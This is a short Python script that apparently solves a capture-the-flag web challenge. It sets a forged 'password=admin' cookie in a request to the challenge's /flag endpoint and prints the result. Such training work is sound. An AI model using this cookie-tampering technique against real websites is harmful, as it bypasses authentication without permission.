import requests

print(requests.get("http://web-05.challs.olicyber.it/flag",cookies=dict(password="admin")).content.decode("utf-8"))